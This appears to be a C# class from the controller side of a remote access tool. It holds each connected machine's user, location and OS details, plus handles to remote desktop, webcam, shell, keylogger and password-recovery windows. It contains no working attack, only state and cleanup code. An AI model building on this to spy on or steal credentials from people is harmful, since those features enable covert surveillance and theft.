using System;
using System.Windows.Forms;
using xServer.Core.ReverseProxy;
using xServer.Core.Utilities;
using xServer.Forms;

namespace xServer.Core.Networking
{
    public class UserState : IDisposable
    {
        public string Version { get; set; }
        public string OperatingSystem { get; set; }
        public string AccountType { get; set; }
        public int ImageIndex { get; set; }
        public string Country { get; set; }
        public string CountryCode { get; set; }
        public string Region { get; set; }
        public string City { get; set; }
        public string Id { get; set; }
        public string Username { get; set; }
        public string PCName { get; set; }
        public string UserAtPc { get { return string.Format("{0}@{1}", Username, PCName); } }
        public string CountryWithCode { get { return string.Format("{0} [{1}]", Country, CountryCode); } }
        public string Tag { get; set; }
        public string DownloadDirectory { get; set; }

        public FrmRemoteDesktop FrmRdp { get; set; }
        public FrmRemoteWebcam FrmWebcam { get; set; }
        public FrmTaskManager FrmTm { get; set; }
        public FrmFileManager FrmFm { get; set; }
        public FrmRegistryEditor FrmRe { get; set; }
        public FrmSystemInformation FrmSi { get; set; }
        public FrmRemoteShell FrmRs { get; set; }
        public FrmStartupManager FrmStm { get; set; }
        public FrmKeylogger FrmKl { get; set; }
        public FrmReverseProxy FrmProxy { get; set; }
        public FrmPasswordRecovery FrmPass { get; set; }
        public FrmConnections FrmCon { get; set; }
        public FrmRemoteChat FrmChat { get; set; }


        public bool ReceivedLastDirectory { get; set; }
        public UnsafeStreamCodec StreamCodec { get; set; }
        public ReverseProxyServer ProxyServer { get; set; }

        public bool ProcessingDirectory
        {
            get
            {
                lock (_processingDirectoryLock)
                {
                    return _processingDirectory;
                }
            }
            set
            {
                lock (_processingDirectoryLock)
                {
                    _processingDirectory = value;
                }
            }
        }
        private bool _processingDirectory;
        private readonly object _processingDirectoryLock;

        public UserState()
        {
            ReceivedLastDirectory = true;
            _processingDirectory = false;
            _processingDirectoryLock = new object();
        }

        public void Dispose()
        {
            Dispose(true);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                try
                {
                    if (FrmRdp != null)
                        FrmRdp.Invoke((MethodInvoker)delegate { FrmRdp.Close(); });
                    if (FrmWebcam != null)
                        FrmWebcam.Invoke((MethodInvoker)delegate { FrmWebcam.Close(); });
                    if (FrmTm != null)
                        FrmTm.Invoke((MethodInvoker)delegate { FrmTm.Close(); });
                    if (FrmFm != null)
                        FrmFm.Invoke((MethodInvoker)delegate { FrmFm.Close(); });
                    if (FrmRe != null)
                        FrmRe.Invoke((MethodInvoker)delegate { FrmRe.Close(); });
                    if (FrmSi != null)
                        FrmSi.Invoke((MethodInvoker)delegate { FrmSi.Close(); });
                    if (FrmRs != null)
                        FrmRs.Invoke((MethodInvoker)delegate { FrmRs.Close(); });
                    if (FrmStm != null)
                        FrmStm.Invoke((MethodInvoker)delegate { FrmStm.Close(); });
                    if (FrmKl != null)
                        FrmKl.Invoke((MethodInvoker)delegate { FrmKl.Close(); });
                    if (FrmProxy != null)
                        FrmProxy.Invoke((MethodInvoker)delegate { FrmProxy.Close(); });
                    if (FrmPass != null)
                        FrmPass.Invoke((MethodInvoker)delegate { FrmPass.Close(); });
                    if (FrmCon != null)
                        FrmCon.Invoke((MethodInvoker)delegate { FrmCon.Close(); });
                    if (FrmChat != null)
                        FrmChat.Invoke((MethodInvoker)delegate { FrmChat.Close(); });
                }
                catch (InvalidOperationException)
                {
                }

                if (StreamCodec != null)
                    StreamCodec.Dispose();
            }
        }
    }
}